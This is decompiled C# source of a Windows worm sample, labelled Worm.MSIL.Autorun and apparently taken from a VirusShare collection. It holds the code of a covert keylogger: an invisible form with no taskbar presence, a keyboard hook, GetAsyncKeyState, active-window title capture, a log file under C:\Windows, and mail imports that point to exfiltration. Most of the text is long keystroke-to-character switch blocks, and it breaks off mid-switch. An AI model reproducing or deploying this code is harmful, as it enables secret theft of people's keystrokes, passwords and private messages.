// Decompiled with JetBrains decompiler
// Type: Stub.Form1
// Assembly: Stub, Version=2.0.0.2, Culture=neutral, PublicKeyToken=null
// MVID: 7D411123-1510-4B4C-A827-9A7711A18EED
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00006-msil\Worm.MSIL.Autorun.go-2cb08728215330fb27646533f27cc81a45f52299328a6ef4b30680f5dbd57d27.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.FileIO;
using Microsoft.Win32;
using Stub.My;
using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Windows.Forms;

namespace Stub
{
  [DesignerGenerated]
  public class Form1 : Form
  {
    private IContainer components;
    [AccessedThroughProperty("Timer1")]
    private System.Windows.Forms.Timer _Timer1;
    [AccessedThroughProperty("TextBox1")]
    private TextBox _TextBox1;
    [AccessedThroughProperty("TextBox2")]
    private TextBox _TextBox2;
    [AccessedThroughProperty("TextBox3")]
    private TextBox _TextBox3;
    [AccessedThroughProperty("Timer2")]
    private System.Windows.Forms.Timer _Timer2;
    [AccessedThroughProperty("Timer3")]
    private System.Windows.Forms.Timer _Timer3;
    [AccessedThroughProperty("Timer4")]
    private System.Windows.Forms.Timer _Timer4;
    private string[] options;
    private string text1;
    private string text2;
    private string strax1;
    private string strax2;
    private string strax3;
    private int result;
    private string FileName;
    private string datenow;
    private const string FileSplit = "@StRaXxXD@";
    [AccessedThroughProperty("kbHook")]
    private Form1.KeyboardHook _kbHook;
    private string strin;

    public Form1()
    {
      this.Load += new EventHandler(this.Form1_Load);
      this.FileName = "C:\\Windows\\a.txt";
      this.datenow = MyProject.Computer.Name + DateTime.Now.ToString().Replace("/", "-").Replace(" ", "---").Replace(":", "-");
      this.kbHook = new Form1.KeyboardHook();
      this.strin = (string) null;
      this.InitializeComponent();
    }

    [DebuggerNonUserCode]
    protected override void Dispose(bool disposing)
    {
      try
      {
        if (!disposing || this.components == null)
          return;
        this.components.Dispose();
      }
      finally
      {
        base.Dispose(disposing);
      }
    }

    [DebuggerStepThrough]
    private void InitializeComponent()
    {
      this.components = (IContainer) new System.ComponentModel.Container();
      ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof (Form1));
      this.Timer1 = new System.Windows.Forms.Timer(this.components);
      this.TextBox1 = new TextBox();
      this.TextBox2 = new TextBox();
      this.TextBox3 = new TextBox();
      this.Timer2 = new System.Windows.Forms.Timer(this.components);
      this.Timer3 = new System.Windows.Forms.Timer(this.components);
      this.Timer4 = new System.Windows.Forms.Timer(this.components);
      this.SuspendLayout();
      this.Timer1.Interval = 900000;
      TextBox textBox1_1 = this.TextBox1;
      Point point1 = new Point(14, 11);
      Point point2 = point1;
      textBox1_1.Location = point2;
      this.TextBox1.Multiline = true;
      this.TextBox1.Name = "TextBox1";
      TextBox textBox1_2 = this.TextBox1;
      Size size1 = new Size(432, 263);
      Size size2 = size1;
      textBox1_2.Size = size2;
      this.TextBox1.TabIndex = 0;
      TextBox textBox2_1 = this.TextBox2;
      point1 = new Point(14, 280);
      Point point3 = point1;
      textBox2_1.Location = point3;
      this.TextBox2.Name = "TextBox2";
      TextBox textBox2_2 = this.TextBox2;
      size1 = new Size(171, 20);
      Size size3 = size1;
      textBox2_2.Size = size3;
      this.TextBox2.TabIndex = 1;
      TextBox textBox3_1 = this.TextBox3;
      point1 = new Point(267, 282);
      Point point4 = point1;
      textBox3_1.Location = point4;
      this.TextBox3.Name = "TextBox3";
      TextBox textBox3_2 = this.TextBox3;
      size1 = new Size(178, 20);
      Size size4 = size1;
      textBox3_2.Size = size4;
      this.TextBox3.TabIndex = 2;
      this.AutoScaleDimensions = new SizeF(6f, 13f);
      this.AutoScaleMode = AutoScaleMode.Font;
      size1 = new Size(464, 307);
      this.ClientSize = size1;
      this.Controls.Add((Control) this.TextBox3);
      this.Controls.Add((Control) this.TextBox2);
      this.Controls.Add((Control) this.TextBox1);
      this.FormBorderStyle = FormBorderStyle.None;
      this.Icon = (Icon) componentResourceManager.GetObject("$this.Icon");
      this.MaximizeBox = false;
      this.MinimizeBox = false;
      this.Name = nameof (Form1);
      this.Opacity = 0.0;
      this.ShowIcon = false;
      this.ShowInTaskbar = false;
      this.Text = "Stub";
      this.ResumeLayout(false);
      this.PerformLayout();
    }

    internal virtual System.Windows.Forms.Timer Timer1
    {
      [DebuggerNonUserCode] get => this._Timer1;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.Timer1_Tick);
        if (this._Timer1 != null)
          this._Timer1.Tick -= eventHandler;
        this._Timer1 = value;
        if (this._Timer1 == null)
          return;
        this._Timer1.Tick += eventHandler;
      }
    }

    internal virtual TextBox TextBox1
    {
      [DebuggerNonUserCode] get => this._TextBox1;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set => this._TextBox1 = value;
    }

    internal virtual TextBox TextBox2
    {
      [DebuggerNonUserCode] get => this._TextBox2;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set => this._TextBox2 = value;
    }

    internal virtual TextBox TextBox3
    {
      [DebuggerNonUserCode] get => this._TextBox3;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set => this._TextBox3 = value;
    }

    internal virtual System.Windows.Forms.Timer Timer2
    {
      [DebuggerNonUserCode] get => this._Timer2;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.Timer2_Tick);
        if (this._Timer2 != null)
          this._Timer2.Tick -= eventHandler;
        this._Timer2 = value;
        if (this._Timer2 == null)
          return;
        this._Timer2.Tick += eventHandler;
      }
    }

    internal virtual System.Windows.Forms.Timer Timer3
    {
      [DebuggerNonUserCode] get => this._Timer3;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.Timer3_Tick);
        if (this._Timer3 != null)
          this._Timer3.Tick -= eventHandler;
        this._Timer3 = value;
        if (this._Timer3 == null)
          return;
        this._Timer3.Tick += eventHandler;
      }
    }

    internal virtual System.Windows.Forms.Timer Timer4
    {
      [DebuggerNonUserCode] get => this._Timer4;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.Timer4_Tick);
        if (this._Timer4 != null)
          this._Timer4.Tick -= eventHandler;
        this._Timer4 = value;
        if (this._Timer4 == null)
          return;
        this._Timer4.Tick += eventHandler;
      }
    }

    [DllImport("user32", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int GetAsyncKeyState(long vKey);

    private virtual Form1.KeyboardHook kbHook
    {
      [DebuggerNonUserCode] get => this._kbHook;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        Form1.KeyboardHook.KeyDownEventHandler downEventHandler = new Form1.KeyboardHook.KeyDownEventHandler(this.shiftandcaps);
        if (this._kbHook != null)
          Form1.KeyboardHook.KeyDown -= downEventHandler;
        this._kbHook = value;
        if (this._kbHook == null)
          return;
        Form1.KeyboardHook.KeyDown += downEventHandler;
      }
    }

    [DllImport("user32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int GetForegroundWindow();

    [DllImport("user32.dll", EntryPoint = "GetWindowTextA", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int GetWindowText(int hwnd, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpString, int cch);

    private string GetActiveWindowTitle()
    {
      string lpString = new string(char.MinValue, 100);
      Form1.GetWindowText(Form1.GetForegroundWindow(), ref lpString, 100);
      return lpString.Substring(0, checked (Strings.InStr(lpString, "\0") - 1));
    }

    public void shiftandcaps(Keys Key)
    {
      if (!MyProject.Computer.Keyboard.ShiftKeyDown & !MyProject.Computer.Keyboard.CapsLock)
      {
        switch (Key)
        {
          case Keys.Back:
            this.TextBox1.Text = this.TextBox1.Text.Remove(checked (this.TextBox1.Text.Length - 1), 1);
            break;
          case Keys.Tab:
            this.TextBox1.Text += "[TAB]";
            break;
          case Keys.Return:
            this.TextBox1.Text += "\r\n";
            break;
          case Keys.Escape:
            this.TextBox1.Text += "[ESC]";
            break;
          case Keys.Space:
            this.TextBox1.Text += " ";
            break;
          case Keys.End:
            this.TextBox1.Text += "[END]";
            break;
          case Keys.Left:
            this.TextBox1.Text += "?";
            break;
          case Keys.Up:
            this.TextBox1.Text += "?";
            break;
          case Keys.Right:
            this.TextBox1.Text += "?";
            break;
          case Keys.Down:
            this.TextBox1.Text += "?";
            break;
          case Keys.Delete:
            this.TextBox1.Text = this.TextBox1.Text.Remove(checked (this.TextBox1.Text.Length - 1), 1);
            break;
          case Keys.D0:
            this.TextBox1.Text += "0";
            break;
          case Keys.D1:
            this.TextBox1.Text += "1";
            break;
          case Keys.D2:
            this.TextBox1.Text += "2";
            break;
          case Keys.D3:
            this.TextBox1.Text += "3";
            break;
          case Keys.D4:
            this.TextBox1.Text += "4";
            break;
          case Keys.D5:
            this.TextBox1.Text += "5";
            break;
          case Keys.D6:
            this.TextBox1.Text += "6";
            break;
          case Keys.D7:
            this.TextBox1.Text += "7";
            break;
          case Keys.D8:
            this.TextBox1.Text += "8";
            break;
          case Keys.D9:
            this.TextBox1.Text += "9";
            break;
          case Keys.A:
            this.TextBox1.Text += "a";
            break;
          case Keys.B:
            this.TextBox1.Text += "b";
            break;
          case Keys.C:
            this.TextBox1.Text += "c";
            break;
          case Keys.D:
            this.TextBox1.Text += "d";
            break;
          case Keys.E:
            this.TextBox1.Text += "e";
            break;
          case Keys.F:
            this.TextBox1.Text += "f";
            break;
          case Keys.G:
            this.TextBox1.Text += "g";
            break;
          case Keys.H:
            this.TextBox1.Text += "h";
            break;
          case Keys.I:
            this.TextBox1.Text += "i";
            break;
          case Keys.J:
            this.TextBox1.Text += "j";
            break;
          case Keys.K:
            this.TextBox1.Text += "k";
            break;
          case Keys.L:
            this.TextBox1.Text += "l";
            break;
          case Keys.M:
            this.TextBox1.Text += "m";
            break;
          case Keys.N:
            this.TextBox1.Text += "n";
            break;
          case Keys.O:
            this.TextBox1.Text += "o";
            break;
          case Keys.P:
            this.TextBox1.Text += "p";
            break;
          case Keys.Q:
            this.TextBox1.Text += "q";
            break;
          case Keys.R:
            this.TextBox1.Text += "r";
            break;
          case Keys.S:
            this.TextBox1.Text += "s";
            break;
          case Keys.T:
            this.TextBox1.Text += "t";
            break;
          case Keys.U:
            this.TextBox1.Text += "u";
            break;
          case Keys.V:
            this.TextBox1.Text += "v";
            break;
          case Keys.W:
            this.TextBox1.Text += "w";
            break;
          case Keys.X:
            this.TextBox1.Text += "x";
            break;
          case Keys.Y:
            this.TextBox1.Text += "y";
            break;
          case Keys.Z:
            this.TextBox1.Text += "z";
            break;
          case Keys.NumPad0:
            this.TextBox1.Text += "0";
            break;
          case Keys.NumPad1:
            this.TextBox1.Text += "1";
            break;
          case Keys.NumPad2:
            this.TextBox1.Text += "2";
            break;
          case Keys.NumPad3:
            this.TextBox1.Text += "3";
            break;
          case Keys.NumPad4:
            this.TextBox1.Text += "4";
            break;
          case Keys.NumPad5:
            this.TextBox1.Text += "5";
            break;
          case Keys.NumPad6:
            this.TextBox1.Text += "6";
            break;
          case Keys.NumPad7:
            this.TextBox1.Text += "7";
            break;
          case Keys.NumPad8:
            this.TextBox1.Text += "8";
            break;
          case Keys.NumPad9:
            this.TextBox1.Text += "9";
            break;
          case Keys.Multiply:
            this.TextBox1.Text += "*";
            break;
          case Keys.Add:
            this.TextBox1.Text += "+";
            break;
          case Keys.Subtract:
            this.TextBox1.Text += "-";
            break;
          case Keys.Decimal:
            this.TextBox1.Text += ".";
            break;
          case Keys.Divide:
            this.TextBox1.Text += "/";
            break;
          case Keys.F1:
            this.TextBox1.Text += "[F1]";
            break;
          case Keys.F2:
            this.TextBox1.Text += "[F2]";
            break;
          case Keys.F3:
            this.TextBox1.Text += "[F3]";
            break;
          case Keys.F4:
            this.TextBox1.Text += "[F4]";
            break;
          case Keys.F5:
            this.TextBox1.Text += "[F5]";
            break;
          case Keys.F6:
            this.TextBox1.Text += "[F6]";
            break;
          case Keys.F7:
            this.TextBox1.Text += "[F7]";
            break;
          case Keys.F8:
            this.TextBox1.Text += "[F8]";
            break;
          case Keys.F9:
            this.TextBox1.Text += "[F9]";
            break;
          case Keys.F10:
            this.TextBox1.Text += "[F10]";
            break;
          case Keys.F11:
            this.TextBox1.Text += "[F11]";
            break;
          case Keys.F12:
            this.TextBox1.Text += "[F12]";
            break;
          case Keys.OemSemicolon:
            this.TextBox1.Text += ";";
            break;
          case Keys.Oemcomma:
            this.TextBox1.Text += ",";
            break;
          case Keys.OemMinus:
            this.TextBox1.Text += "-";
            break;
          case Keys.OemPeriod:
            this.TextBox1.Text += ".";
            break;
          case Keys.OemQuestion:
            this.TextBox1.Text += "/";
            break;
          case Keys.Oemtilde:
            this.TextBox1.Text += "`";
            break;
          case Keys.OemOpenBrackets:
            this.TextBox1.Text += "[";
            break;
          case Keys.OemPipe:
            this.TextBox1.Text += "\\";
            break;
          case Keys.OemCloseBrackets:
            this.TextBox1.Text += "]";
            break;
          case Keys.OemQuotes:
            this.TextBox1.Text += "'";
            break;
        }
      }
      else if (!MyProject.Computer.Keyboard.ShiftKeyDown & MyProject.Computer.Keyboard.CapsLock)
      {
        switch (Key)
        {
          case Keys.Back:
            this.TextBox1.Text = this.TextBox1.Text.Remove(checked (this.TextBox1.Text.Length - 1), 1);
            break;
          case Keys.Tab:
            this.TextBox1.Text += "[TAB]";
            break;
          case Keys.Return:
            this.TextBox1.Text += "\r\n";
            break;
          case Keys.Escape:
            this.TextBox1.Text += "[ESC]";
            break;
          case Keys.Space:
            this.TextBox1.Text += " ";
            break;
          case Keys.End:
            this.TextBox1.Text += "[END]";
            break;
          case Keys.Left:
            this.TextBox1.Text += "?";
            break;
          case Keys.Up:
            this.TextBox1.Text += "?";
            break;
          case Keys.Right:
            this.TextBox1.Text += "?";
            break;
          case Keys.Down:
            this.TextBox1.Text += "?";
            break;
          case Keys.Delete:
            this.TextBox1.Text = this.TextBox1.Text.Remove(checked (this.TextBox1.Text.Length - 1), 1);
            break;
          case Keys.D0:
            this.TextBox1.Text += "0";
            break;
          case Keys.D1:
            this.TextBox1.Text += "1";
            break;
          case Keys.D2:
            this.TextBox1.Text += "2";
            break;
          case Keys.D3:
            this.TextBox1.Text += "3";
            break;
          case Keys.D4:
            this.TextBox1.Text += "4";
            break;
          case Keys.D5:
            this.TextBox1.Text += "5";
            break;
          case Keys.D6:
            this.TextBox1.Text += "6";
            break;
          case Keys.D7:
            this.TextBox1.Text += "7";
            break;
          case Keys.D8:
            this.TextBox1.Text += "8";
            break;
          case Keys.D9:
            this.TextBox1.Text += "9";
            break;
          case Keys.A:
            this.TextBox1.Text += "A";
            break;
          case Keys.B:
            this.TextBox1.Text += "B";
            break;
          case Keys.C:
            this.TextBox1.Text += "C";
            break;
          case Keys.D:
            this.TextBox1.Text += "D";
            break;
          case Keys.E:
            this.TextBox1.Text += "E";
            break;
          case Keys.F:
            this.TextBox1.Text += "F";
            break;
          case Keys.G:
            this.TextBox1.Text += "G";
            break;
          case Keys.H:
            this.TextBox1.Text += "H";
            break;
          case Keys.I:
            this.TextBox1.Text += "I";
            break;
          case Keys.J:
            this.TextBox1.Text += "J";
            break;
          case Keys.K:
            this.TextBox1.Text += "K";
            break;
          case Keys.L:
            this.TextBox1.Text += "L";
            break;
          case Keys.M:
            this.TextBox1.Text += "M";
            break;
          case Keys.N:
            this.TextBox1.Text += "N";
            break;
          case Keys.O:
            this.TextBox1.Text += "O";
            break;
          case Keys.P:
            this.TextBox1.Text += "P";
            break;
          case Keys.Q:
            this.TextBox1.Text += "Q";
            break;
          case Keys.R:
            this.TextBox1.Text += "R";
            break;
          case Keys.S:
            this.TextBox1.Text += "S";
            break;
          case Keys.T:
            this.TextBox1.Text += "T";
            break;
          case Keys.U:
            this.TextBox1.Text += "U";
            break;
          case Keys.V:
            this.TextBox1.Text += "V";
            break;
          case Keys.W:
            this.TextBox1.Text += "W";
            break;
          case Keys.X:
            this.TextBox1.Text += "X";
            break;
          case Keys.Y:
            this.TextBox1.Text += "Y";
            break;
          case Keys.Z:
            this.TextBox1.Text += "Z";
            break;
          case Keys.NumPad0:
            this.TextBox1.Text += "0";
            break;
          case Keys.NumPad1:
            this.TextBox1.Text += "1";
            break;
          case Keys.NumPad2:
            this.TextBox1.Text += "2";
            break;
          case Keys.NumPad3:
            this.TextBox1.Text += "3";
            break;
          case Keys.NumPad4:
            this.TextBox1.Text += "4";
            break;
          case Keys.NumPad5:
            this.TextBox1.Text += "5";
            break;
          case Keys.NumPad6:
            this.TextBox1.Text += "6";
            break;
          case Keys.NumPad7:
            this.TextBox1.Text += "7";
            break;
          case Keys.NumPad8:
            this.TextBox1.Text += "8";
            break;
          case Keys.NumPad9:
            this.TextBox1.Text += "9";
            break;
          case Keys.Multiply:
            this.TextBox1.Text += "*";
            break;
          case Keys.Add:
            this.TextBox1.Text += "+";
            break;
          case Keys.Subtract:
            this.TextBox1.Text += "-";
            break;
          case Keys.Decimal:
            this.TextBox1.Text += ".";
            break;
          case Keys.Divide:
            this.TextBox1.Text += "/";
            break;
          case Keys.F1:
            this.TextBox1.Text += "[F1]";
            break;
          case Keys.F2:
            this.TextBox1.Text += "[F2]";
            break;
          case Keys.F3:
            this.TextBox1.Text += "[F3]";
            break;
          case Keys.F4:
            this.TextBox1.Text += "[F4]";
            break;
          case Keys.F5:
            this.TextBox1.Text += "[F5]";
            break;
          case Keys.F6:
            this.TextBox1.Text += "[F6]";
            break;
          case Keys.F7:
            this.TextBox1.Text += "[F7]";
            break;
          case Keys.F8:
            this.TextBox1.Text += "[F8]";
            break;
          case Keys.F9:
            this.TextBox1.Text += "[F9]";
            break;
          case Keys.F10:
            this.TextBox1.Text += "[F10]";
            break;
          case Keys.F11:
            this.TextBox1.Text += "[F11]";
            break;
          case Keys.F12:
            this.TextBox1.Text += "[F12]";
            break;
          case Keys.OemSemicolon:
            this.TextBox1.Text += ";";
            break;
          case Keys.Oemcomma:
            this.TextBox1.Text += ",";
            break;
          case Keys.OemMinus:
            this.TextBox1.Text += "-";
            break;
          case Keys.OemPeriod:
            this.TextBox1.Text += ".";
            break;
          case Keys.OemQuestion:
            this.TextBox1.Text += "/";
            break;
          case Keys.Oemtilde:
            this.TextBox1.Text += "`";
            break;
          case Keys.OemOpenBrackets:
            this.TextBox1.Text += "[";
            break;
          case Keys.OemPipe:
            this.TextBox1.Text += "\\";
            break;
          case Keys.OemCloseBrackets:
            this.TextBox1.Text += "]";
            break;
          case Keys.OemQuotes:
            this.TextBox1.Text += "'";
            break;
        }
      }
      else if (MyProject.Computer.Keyboard.ShiftKeyDown & MyProject.Computer.Keyboard.CapsLock)
      {
        switch (Key)
        {
          case Keys.Back:
            this.TextBox1.Text = this.TextBox1.Text.Remove(checked (this.TextBox1.Text.Length - 1), 1);
            break;
          case Keys.Tab:
            this.TextBox1.Text += "[TAB]";
            break;
          case Keys.Return:
            this.TextBox1.Text += "\r\n";
            break;
          case Keys.Escape:
            this.TextBox1.Text += "[ESC]";
            break;
          case Keys.Space:
            this.TextBox1.Text += " ";
            break;
          case Keys.End:
            this.TextBox1.Text += "[END]";
            break;
          case Keys.Left:
            this.TextBox1.Text += "?";
            break;
          case Keys.Up:
            this.TextBox1.Text += "?";
            break;
          case Keys.Right:
            this.TextBox1.Text += "?";
            break;
          case Keys.Down:
            this.TextBox1.Text += "?";
            break;
          case Keys.Delete:
            this.TextBox1.Text = this.TextBox1.Text.Remove(checked (this.TextBox1.Text.Length - 1), 1);
            break;
          case Keys.D0:
            this.TextBox1.Text += ")";
            break;
          case Keys.D1:
            this.TextBox1.Text += "!";
            break;
          case Keys.D2:
            this.TextBox1.Text += "@";
            break;
          case Keys.D3:
            this.TextBox1.Text += "#";
            break;
          case Keys.D4:
            this.TextBox1.Text += "$";
            break;
          case Keys.D5:
            this.TextBox1.Text += "%";
            break;
          case Keys.D6:
            this.TextBox1.Text += "^";
            break;
          case Keys.D7:
            this.TextBox1.Text += "&";
            break;
          case Keys.D8:
            this.TextBox1.Text += "*";
            break;
          case Keys.D9:
            this.TextBox1.Text += "(";
            break;
          case Keys.A:
            this.TextBox1.Text += "A";
            break;
          case Keys.B:
            this.TextBox1.Text += "B";
            break;
          case Keys.C:
            this.TextBox1.Text += "C";
            break;
          case Keys.D:
            this.TextBox1.Text += "D";
            break;
          case Keys.E:
            this.TextBox1.Text += "E";
            break;
          case Keys.F:
            this.TextBox1.Text += "F";
            break;
          case Keys.G:
            this.TextBox1.Text += "G";
            break;
          case Keys.H:
            this.TextBox1.Text += "H";
            break;
          case Keys.I:
            this.TextBox1.Text += "I";
            break;
          case Keys.J:
            this.TextBox1.Text += "J";
            break;
          case Keys.K:
            this.TextBox1.Text += "K";
            break;
          case Keys.L:
            this.TextBox1.Text += "L";
            break;
          case Keys.M:
            this.TextBox1.Text += "M";
            break;
          case Keys.N:
            this.TextBox1.Text += "N";
            break;
          case Keys.O:
            this.TextBox1.Text += "O";
            break;
          case Keys.P:
            this.TextBox1.Text += "P";
            break;
          case Keys.Q:
            this.TextBox1.Text += "Q";
            break;
          case Keys.R:
            this.TextBox1.Text += "R";
            break;
          case Keys.S:
            this.TextBox1.Text += "S";
            break;
          case Keys.T:
            this.TextBox1.Text += "T";
            break;
          case Keys.U:
            this.TextBox1.Text += "U";
            break;
          case Keys.V:
            this.TextBox1.Text += "V";
            break;
          case Keys.W:
            this.TextBox1.Text += "W";
            break;
          case Keys.X:
            this.TextBox1.Text += "X";
            break;
          case Keys.Y:
            this.TextBox1.Text += "Y";
            break;
          case Keys.Z:
            this.TextBox1.Text += "Z";
            break;
          case Keys.Multiply:
            this.TextBox1.Text += "*";
            break;
          case Keys.Add:
            this.TextBox1.Text += "+";
            break;
          case Keys.Subtract:
            this.TextBox1.Text += "-";
            break;
          case Keys.Decimal:
            this.TextBox1.Text += ".";
            break;
          case Keys.Divide:
            this.TextBox1.Text += "/";
            break;
          case Keys.F1:
            this.TextBox1.Text += "[F1]";
            break;
          case Keys.F2:
            this.TextBox1.Text += "[F2]";
            break;
          case Keys.F3:
            this.TextBox1.Text += "[F3]";
            break;
          case Keys.F4:
            this.TextBox1.Text += "[F4]";
            break;
          case Keys.F5:
            this.TextBox1.Text += "[F5]";
            break;
          case Keys.F6:
            this.TextBox1.Text += "[F6]";
            break;
          case Keys.F7:
            this.TextBox1.Text += "[F7]";
            break;
          case Keys.F8:
            this.TextBox1.Text += "[F8]";
            break;
          case Keys.F9:
            this.TextBox1.Text += "[F9]";
            break;
          case Keys.F10:
            this.TextBox1.Text += "[F10]";
            break;
          case Keys.F11:
            this.TextBox1.Text += "[F11]";
            break;
          case Keys.F12:
            this.TextBox1.Text += "[F12]";
            break;
          case Keys.OemSemicolon:
            this.TextBox1.Text += ":";
            break;
          case Keys.Oemcomma:
            this.TextBox1.Text += "<";
            break;
          case Keys.OemMinus:
            this.TextBox1.Text += "_";
            break;
          case Keys.OemPeriod:
            this.TextBox1.Text += ">";
            break;
          case Keys.OemQuestion:
            this.TextBox1.Text += "?";
            break;
          case Keys.Oemtilde:
            this.TextBox1.Text += "~";
            break;
          case Keys.OemOpenBrackets:
            this.TextBox1.Text += "{";
            break;
          case Keys.OemPipe:
            this.TextBox1.Text += "|";
            break;
          case Keys.OemCloseBrackets:
            this.TextBox1.Text += "}";
            break;
          case Keys.OemQuotes:
            this.TextBox1.Text += "'";
            break;
        }
      }
      else if (!MyProject.Computer.Keyboard.ShiftKeyDown & MyProject.Computer.Keyboard.CapsLock)
      {
        switch (Key)
        {
          case Keys.Back:
            this.TextBox1.Text = this.TextBox1.Text.Remove(checked (this.TextBox1.Text.Length - 1), 1);
            break;
          case Keys.Tab:
            this.TextBox1.Text += "[TAB]";
            break;
          case Keys.Return:
            this.TextBox1.Text += "\r\n";
            break;
          case Keys.Escape:
            this.TextBox1.Text += "[ESC]";
            break;
          case Keys.Space:
            this.TextBox1.Text += " ";
            break;
          case Keys.End:
            this.TextBox1.Text += "[END]";
            break;
          case Keys.Left:
            this.TextBox1.Text += "?";
            break;
          case Keys.Up:
            this.TextBox1.Text += "?";
            break;
          case Keys.Right:
            this.TextBox1.Text += "?";
            break;
          case Keys.Down:
            this.TextBox1.Text += "?";
            break;
          case Keys.Delete:
            this.TextBox1.Text = this.TextBox1.Text.Remove(checked (this.TextBox1.Text.Length - 1), 1);
            break;
          case Keys.D0:
            this.TextBox1.Text += "0";
            break;
          case Keys.D1:
            this.TextBox1.Text += "1";
            break;
          case Keys.D2:
            this.TextBox1.Text += "2";
            break;
          case Keys.D3:
            this.TextBox1.Text += "3";
            break;
          case Keys.D4:
            this.TextBox1.Text += "4";
            break;
          case Keys.D5:
            this.TextBox1.Text += "5";
            break;
          case Keys.D6:
            this.TextBox1.Text += "6";
            break;
          case Keys.D7:
            this.TextBox1.Text += "7";
            break;
          case Keys.D8:
            this.TextBox1.Text += "8";
            break;
          case Keys.D9:
            this.TextBox1.Text += "9";
            break;
          case Keys.A:
            this.TextBox1.Text += "a";
            break;
          case Keys.B:
            this.TextBox1.Text += "b";
            break;
          case Keys.C:
            this.TextBox1.Text += "c";
            break;
          case Keys.D:
            this.TextBox1.Text += "d";
            break;
          case Keys.E:
            this.TextBox1.Text += "e";
            break;
          case Keys.F:
            this.TextBox1.Text += "f";
            break;
          case Keys.G:
            this.TextBox1.Text += "g";
            break;
          case Keys.H:
            this.TextBox1.Text += "h";
            break;
          case Keys.I:
            this.TextBox1.Text += "i";
            break;
          case Keys.J:
            this.TextBox1.Text += "j";
            break;
          case Keys.K:
            this.TextBox1.Text += "k";
            break;
          case Keys.L:
            this.TextBox1.Text += "l";
            break;
          case Keys.M:
            this.TextBox1.Text += "m";
            break;
          case Keys.N:
            this.TextBox1.Text += "n";
            break;
          case Keys.O:
            this.TextBox1.Text += "o";
            break;
          case Keys.P:
            this.TextBox1.Text += "p";
            break;
          case Keys.Q:
            this.TextBox1.Text += "q";
            break;
          case Keys.R:
            this.TextBox1.Text += "r";
            break;
          case Keys.S:
            this.TextBox1.Text += "s";
            break;
          case Keys.T:
            this.TextBox1.Text += "t";
            break;
          case Keys.U:
            this.TextBox1.Text += "u";
            break;
          case Keys.V:
            this.TextBox1.Text += "v";
            break;
          case Keys.W:
            this.TextBox1.Text += "w";
            break;
          case Keys.X:
            this.TextBox1.Text += "x";
            break;
          case Keys.Y:
            this.TextBox1.Text += "y";
            break;
          case Keys.Z:
            this.TextBox1.Text += "z";
            break;
          case Keys.Multiply:
            this.TextBox1.Text += "*";
            break;
          case Keys.Add:
            this.TextBox1.Text += "+";
            break;
          case Keys.Subtract:
            this.TextBox1.Text += "-";
            break;
          case Keys.Decimal:
            this.TextBox1.Text += ".";
            break;
          case Keys.Divide:
            this.TextBox1.Text += "/";
            break;
          case Keys.F1:
            this.TextBox1.Text += "[F1]";
            break;
          case Keys.F2:
            this.TextBox1.Text += "[F2]";
            break;
          case Keys.F3:
            this.TextBox1.Text += "[F3]";
            break;
          case Keys.F4:
            this.TextBox1.Text += "[F4]";
            break;
          case Keys.F5:
            this.TextBox1.Text += "[F5]";
            break;
          case Keys.F6:
            this.TextBox1.Text += "[F6]";
            break;
          case Keys.F7:
            this.TextBox1.Text += "[F7]";
            break;
          case Keys.F8:
            this.TextBox1.Text += "[F8]";
            break;
          case Keys.F9:
            this.TextBox1.Text += "[F9]";
            break;
          case Keys.F10:
            this.TextBox1.Text += "[F10]";
            break;
          case Keys.F11:
            this.TextBox1.Text += "[F11]";
            break;
          case Keys.F12:
            this.TextBox1.Text += "[F12]";
            break;
          case Keys.OemSemicolon:
            this.TextBox1.Text += ";";
            break;
          case Keys.Oemcomma:
            this.TextBox1.Text += ",";
            break;
          case Keys.OemMinus:
            this.TextBox1.Text += "-";
            break;
          case Keys.OemPeriod:
            this.TextBox1.Text += ".";
            break;
          case Keys.OemQuestion:
            this.TextBox1.Text += "/";
            break;
          case Keys.Oemtilde:
            this.TextBox1.Text += "`";
            break;
          case Keys.OemOpenBrackets:
            this.TextBox1.Text += "[";
            break;
          case Keys.OemPipe:
            this.TextBox1.Text += "\\";
            break;
          case Keys.OemCloseBrackets:
            this.TextBox1.Text += "]";
            break;
          case Keys.OemQuotes:
            this.TextBox1.Text += "'";
            break;
        }
      }
      else
      {
        if (!(MyProject.Computer.Keyboard.ShiftKeyDown & !MyProject.Computer.Keyboard.CapsLock))
          return;
        switch (Key)
        {
          case Keys.Back:
            this.TextBox1.Text = this.TextBox1.Text.Remove(checked (this.TextBox1.Text.Length - 1), 1);
            break;
          case Keys.Tab:
            this.TextBox1.Text += "[TAB]";
            break;
          case Keys.Return:
            this.TextBox1.Text += "\r\n";
            break;
          case Keys.Escape:
            this.TextBox1.Text += "[ESC]";
            break;
          case Keys.Space:
            this.TextBox1.Text += " ";
            break;
          case Keys.End:
            this.TextBox1.Text += "[END]";
            break;
          case Keys.Left:
            this.TextBox1.Text += "?";
            break;
          case Keys.Up:
            this.TextBox1.Text += "?";
            break;
          case Keys.Right:
            this.TextBox1.Text += "?";
            break;
          case Keys.Down:
            this.TextBox1.Text += "?";
            break;
          case Keys.Delete:
            this.TextBox1.Text = this.TextBox1.Text.Remove(checked (this.TextBox1.Text.Length - 1), 1);
            break;
          case Keys.D0:
            this.TextBox1.Text += ")";
            break;
          case Keys.D1:
            this.TextBox1.Text += "!";
            break;
          case Keys.D2:
